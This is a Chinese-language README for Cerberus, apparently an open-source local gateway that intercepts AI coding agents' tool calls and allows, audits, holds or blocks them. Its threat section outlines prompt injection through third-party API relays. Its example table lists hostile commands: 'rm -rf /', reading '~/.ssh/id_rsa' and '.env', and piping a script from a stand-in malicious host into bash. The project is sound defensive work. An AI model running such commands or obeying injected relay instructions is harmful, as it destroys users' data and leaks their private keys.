# Cerberus 🐺 · AI Agent 本地安全防火墙

[![license](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](./LICENSE)
[![node](https://img.shields.io/badge/node-%3E%3D20-brightgreen.svg)](https://nodejs.org)
[![platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey.svg)](https://github.com/03viceboll/ai-agent-firewall)
[![zero-leak](https://img.shields.io/badge/Zero--Trust-127.0.0.1%20Local-emerald.svg)](https://github.com/03viceboll/ai-agent-firewall)

![Cerberus AI Agent Firewall Banner](banner.png)

> **为自主式 AI 编程代理（Cursor、Cline、OpenCode、Claude Code、Codex）打造的本地零信任安全网关。**
> 在代理执行任何系统命令或读写文件之前，毫秒级拦截、风险评估，防止中转 API 投毒、未授权命令与核心密钥外泄。

---

## 🎯 为什么需要它？（痛点分析）

当前大量开发者使用第三方中转 API（One-API / New-API / 廉价公益站）驱动 Cursor 或 CLI Agent。然而，**未经审计的中转节点与模型输出存在极高的安全隐患**：

1. **恶意投毒与越狱指令 (Prompt Injection):** 上游恶意篡改或注入系统提示，引导 Agent 执行破坏性命令（如 `rm -rf /`、格式化硬盘）。
2. **敏感凭证被动窃取:** Agent 被诱导读取本地 `~/.ssh/id_rsa`、`.env`、`config.json`，并通过 `curl / wget` 将私钥悄悄回传。
3. **静默下载远端木马:** 自动化安装未审查的恶意 npm/pip 包或执行远端 shell 脚本。

**Cerberus 像一堵看不见的防火墙，架设在 Agent 与你的操作系统之间。0 外部网络依赖，数据 100% 留在本地 `127.0.0.1`。**

---

## ✨ 核心特性

- 🛡️ **双向命令拦截:** 实时拦截 Agent 的所有 Tool Calls（Bash、File Read、File Write、Process Spawn）。
- ⚡ **多维风险评分 (0 - 100):** 基于敏感路径检测、破坏性命令正则、外部网络外传模式秒级计算风险值。
- 🚦 **四阶处置策略:**
  - `ALLOW` (安全操作): 直接放行（如 `git status`, `npm test`）。
  - `AUDIT` (低风险): 放行但记入本地不可篡改审计日志。
  - `HOLD` (中高风险): 暂停执行，在终端或 Web 控制台弹出提示，需人类输入 `y` 确认。
  - `BLOCK` (极危操作): 强制秒级阻断，向 Agent 伪造错误返回，保护系统。
- 📊 **轻量本地看板:** 内置开箱即用的可视化控制台 (`http://127.0.0.1:8787`)，实时观察 Agent 的一举一动。
- 💻 **全跨平台兼容:** 支持 Windows 11、macOS (Apple Silicon / Intel)、Linux。

---

## 🚀 极速上手 (Quick Start)

### 1. 环境准备
- [Node.js **>= 20**](https://nodejs.org) (`node -v`)
- `git`

### 2. 克隆与安装
```bash
git clone https://github.com/03viceboll/ai-agent-firewall.git
cd ai-agent-firewall

npm install
```

### 3. 一键启动守护引擎
- **Windows:**
  双击运行 `start-engine.bat` 或在终端执行：
  ```bash
  node bin/cerberus.mjs start
  ```
- **macOS / Linux:**
  ```bash
  ./start-engine.command
  ```

启动后，网关将在本地 `127.0.0.1:8787` 待命，并自动拦截接入的 Agent 调用。

---

## 📸 运行效果预览

![Cerberus 实时拦截演示](cerberus-demo.gif)

---

## ⚙️ 接入示例 (Cursor / OpenCode / Cline)

### 接入 Cursor / VSCode
在项目根目录或全局配置中引入 Cerberus Hook：
```bash
node bin/cerberus.mjs hook --client cursor
```

### 阻断示例场景
| 拦截场景 | Agent 试图执行的操作 | Cerberus 处置结果 |
|---|---|---|
| **破坏性系统调用** | `rm -rf /` 或 `format D:` | ❌ **BLOCK** (风险分: 100) |
| **敏感私钥读取** | `cat ~/.ssh/id_rsa` / `read .env` | ❌ **BLOCK** (风险分: 95) |
| **管道下载执行** | `curl -s http://malicious.xyz/drop.sh \| bash` | ❌ **BLOCK** (风险分: 98) |
| **正常构建指令** | `npm run build` / `cargo build` | ✅ **ALLOW** (风险分: 0) |

---

## 📄 开源许可证

本项目基于 [Apache-2.0](./LICENSE) 协议完全开源，代码透明无暗门，欢迎社区老哥审阅、Fork 与提交 PR！
